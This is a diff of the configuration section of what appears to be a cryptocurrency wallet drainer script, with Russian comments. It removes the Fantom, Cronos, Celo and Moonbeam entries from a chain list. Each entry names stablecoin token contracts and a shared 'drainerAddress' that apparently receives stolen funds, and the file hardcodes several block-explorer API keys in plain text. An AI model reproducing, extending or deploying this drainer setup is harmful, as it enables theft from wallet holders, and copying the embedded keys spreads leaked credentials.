@@ -20,11 +20,7 @@ const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
 const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
 const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
 const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
-const FTMSCAN_API_KEY = "9H859I1BNAQ6Q3AQ9GKS2VC2XRJW8Q1G3A";
-const CRONOSCAN_API_KEY = "SZ4CZFC6D793W378QMM6IG1IUWEU918BM9";
 const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";
-const CELOSCAN_API_KEY = "ZICUQ6ZFQHD9FQ4Y5H33HC94JFW343H9PI";
-const MOONSCAN_API_KEY = "43IU6Q6RNANXWIE5B4KQV3VQVP6NI3V3PI";
 
 // Конфигурация сетей
 const CHAINS = {
@@ -87,28 +83,6 @@ const CHAINS = {
     explorerApi: "https://api-optimistic.etherscan.io/api",
     explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY
   },
-  250: {
-    name: "Fantom",
-    nativeToken: "FTM",
-    chainIdHex: "0xfa",
-    rpcUrls: ["https://rpc.ftm.tools/"],
-    usdtAddress: "0x049d68029688eAbF473097a2fC38ef61633A3C7A",
-    usdcAddress: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
-    explorerApi: "https://api.ftmscan.com/api",
-    explorerApiKey: FTMSCAN_API_KEY
-  },
-  25: {
-    name: "Cronos",
-    nativeToken: "CRO",
-    chainIdHex: "0x19",
-    rpcUrls: ["https://evm.cronos.org"],
-    usdtAddress: "0x66e428c3f67a68878562e79A0234c1F83c208770",
-    usdcAddress: "0xc21223249CA28397B90C6533D6125c5aD2A9609",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
-    explorerApi: "https://api.cronoscan.com/api",
-    explorerApiKey: CRONOSCAN_API_KEY
-  },
   8453: {
     name: "Base",
     nativeToken: "ETH",
@@ -120,28 +94,6 @@ const CHAINS = {
     explorerApi: "https://api.basescan.org/api",
     explorerApiKey: BASESCAN_API_KEY
   },
-  42220: {
-    name: "Celo",
-    nativeToken: "CELO",
-    chainIdHex: "0xa4ec",
-    rpcUrls: ["https://forno.celo.org"],
-    usdtAddress: "0x48065fbBE91B47C8F257b09E2B48cd42e3cD517",
-    usdcAddress: "0xcebA9300f2b948710d2653dD7B07f33A8B32118",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
-    explorerApi: "https://api.celoscan.io/api",
-    explorerApiKey: CELOSCAN_API_KEY
-  },
-  1284: {
-    name: "Moonbeam",
-    nativeToken: "GLMR",
-    chainIdHex: "0x504",
-    rpcUrls: ["https://rpc.api.moonbeam.network"],
-    usdtAddress: "0x818ec0A7Fe18Ff94269904fCED6AE3DaE6d6DC0b",
-    usdcAddress: "0x8f552a71EFE5eeFc207Bf75485b356A0b3f01eC",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
-    explorerApi: "https://api-moonbeam.moonscan.io/api",
-    explorerApiKey: MOONSCAN_API_KEY
-  }
 };
 
 // Утилита для задержки
